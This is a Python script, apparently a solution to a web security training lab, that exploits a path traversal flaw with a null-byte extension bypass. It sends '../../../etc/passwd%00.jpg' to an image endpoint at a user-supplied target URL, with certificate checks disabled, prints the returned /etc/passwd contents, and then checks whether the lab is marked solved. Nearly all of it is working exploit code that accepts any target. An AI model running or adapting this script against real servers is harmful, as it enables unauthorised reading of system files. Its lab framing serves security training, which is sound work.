"""
    Lab: File path traversal, validation of file extension with null byte bypass

    This lab contains a path traversal vulnerability in the display of product images.
    The application validates the supplied filename, but does not validate the file extension.
    To solve the lab, retrieve the contents of the /etc/passwd file.

    1. Use the file parameter to read the contents of the file /etc/passwd. GET /etc/passwd%00.jpg

    Author: N00BCYB0T
"""

import argparse
from colorama import Fore
import requests
from urllib3.exceptions import InsecureRequestWarning
import urllib.parse
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

URL = None

def main():
    global URL

    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., https://target-lab.com)')
    parser.add_argument('--proxy', help='HTTP Proxy (e.g., http://127.0.0.1:8080)')
    args = parser.parse_args()

    URL = args.url.rstrip('/')
    PROXY = args.proxy

    session = requests.Session()
    session.verify = False  

    if PROXY:
        session.proxies = {
            "http": PROXY,
            "https": PROXY
        }

    print(f"{Fore.YELLOW}[*] Exploiting file path traversal vulnerability...{Fore.RESET}")
    print(f"{Fore.YELLOW}[*] Target URL: {URL}{Fore.RESET}")

    # Step 1: Read the contents of the file /etc/passwd
    print(f"{Fore.YELLOW}[*] Reading the contents of the file /etc/passwd...{Fore.RESET}")
    filename_path = f"{URL}/image?filename=../../../etc/passwd%00.jpg"
    print(f"{Fore.CYAN}[DEBUG] Response:\n{Fore.RESET}{filename_path}")
    passwd = fetch(session, filename_path)
    print(f"{Fore.GREEN}[+] Response:\n{Fore.RESET}{passwd.text}")

    response = fetch(session, "/")

    if "Congratulations, you solved the lab!" in response.text:
        print(f"{Fore.GREEN}[+] Lab solved successfully!{Fore.RESET}")
    else: 
        print(f"{Fore.RED}[-] Failed to solve the lab{Fore.RESET}")

def fetch(session, path):
    try:
        url = path if path.startswith("http") else f"{URL}{path}"
        return session.get(url, allow_redirects=False)
    except Exception as e:
        print(f"{Fore.RED}[!] Failed to fetch {path}: {e}{Fore.RESET}")
        exit(1)

if __name__ == "__main__":
    main()